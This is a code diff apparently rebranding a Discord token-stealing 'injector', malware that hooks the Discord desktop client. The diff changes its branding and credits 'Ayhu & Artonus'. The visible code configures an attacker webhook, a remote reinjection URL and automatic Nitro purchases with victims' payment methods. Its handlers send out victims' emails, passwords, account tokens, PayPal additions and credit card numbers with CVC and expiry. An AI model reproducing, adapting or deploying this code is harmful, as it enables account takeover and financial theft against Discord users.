@@ -6,17 +6,17 @@ const querystring = require('querystring');
 const { BrowserWindow, session } = require('electron');
 
 const config = {
-  webhook: '%WEBHOOK%', //your discord webhook there obviously or use the api from https://github.com/Rdimo/Discord-Webhook-Protector | Recommend using https://github.com/Rdimo/Discord-Webhook-Protector so your webhook can't be spammed or deleted
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
-  auto_buy_nitro: false, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
-  ping_on_run: true, //sends whatever value you have in ping_val when you get a run/login
-  ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
-  embed_name: 'Cyan Kuray INJECTOR', //name of the webhook thats gonna send the info
-  embed_icon: 'https://images-ext-2.discordapp.net/external/Gu7v7UmRxtlpvRQsuPZfA0t9PGmxnzFTYFWJccidNEc/%3Fcid%3D73b8f7b14c5abfc5c477966fe5e3eb1bf04b33a7503c113d%26rid%3Dgiphy.mp4%26ct%3Dg/https/media3.giphy.com/media/05IWH4WAl6yrgFhyRl/giphy.mp4'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
-  embed_color: 0000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
-  injection_url: 'https://raw.githubusercontent.com/portu22/cyaninject/main/injector.js', //injection url for when it reinjects
+  webhook: '%WEBHOOK%', 
+  webhook_protector_key: '%WEBHOOK_KEY%', 
+  auto_buy_nitro: false, 
+  ping_on_run: true, 
+  ping_val: '@everyone',
+  embed_name: 'Kuray Injection', 
+  embed_icon: 'https://github.com/portu22/cyaninject/blob/main/elprimo.png'.replace(/ /g, '%20'), 
+  embed_color: 2895667, 
+  injection_url: 'https://raw.githubusercontent.com/portu22/cyaninject/main/injector.js', 
   /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
+   
    **/
   api: 'https://discord.com/api/v9/users/@me',
   nitro: {
@@ -680,7 +680,7 @@ const login = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -722,7 +722,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -764,7 +764,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -806,7 +806,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -848,7 +848,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
@@ -892,7 +892,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-          text: 'Cyan version of Kuray INJECTOR',
+          text: '🎉・Discord Injection By Ayhu & Artonus・https://github.com/Ayhuuu',
         },
       },
     ],
